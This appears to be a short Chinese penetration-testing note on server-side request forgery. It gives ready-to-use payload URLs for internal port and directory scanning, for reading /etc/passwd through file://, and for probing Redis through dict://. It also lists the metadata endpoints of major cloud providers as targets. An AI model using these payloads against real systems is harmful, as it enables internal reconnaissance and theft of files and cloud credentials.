SSRF(Server-Side Request Forgery：服务器端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)

但是实战中我们遇见更多的是不出网的SSRF，此时我们可以借助SSRF对其目标进行内网端口扫描，文件读取，以及目录扫描

探内网端口  
目录扫描：http://www.xxx.com/?url=http://127.0.0.1/扫描地址  
端口扫描1：http://www.xxx.com/?url=http://127.0.0.1:枚举的端口号/  
端口扫描2：http://www.xxx.com/?url=dict://127.0.0.1:枚举的端口号  

通过协议进行文件读取：http://www.xxx.com/?url=file:///etc/passwd
通过dict协议：探测端口  
http://127.0.0.1/code1.php?url=dict://127.0.0.1:6379


读云上元数据  
其中，端口与目录扫描可以帮助我们对目标的未授权访问漏洞，以及网站指纹进行探测，这里注意一点如果目标资产部署在云上的话，这是我们尝读取元数据  
参考文章：https://mp.weixin.qq.com/s/QzKiStUY1Y3KyrWm8Bvq1A
参考文章：https://mp.weixin.qq.com/s/FfMoxqyGjhptXvn-SMrVkA

此处给出各大云厂商元数据地址

参考链接：https://www.cnblogs.com/zpchcbd/p/17839539.html

阿里云元数据地址：http://100.100.100.200/

腾讯云元数据地址：http://metadata.tencentyun.com/

华为云元数据地址：http://169.254.169.254/

亚马云元数据地址：http://169.254.169.254/

微软云元数据地址：http://169.254.169.254/

谷歌云元数据地址：http://metadata.google.internal/

-----

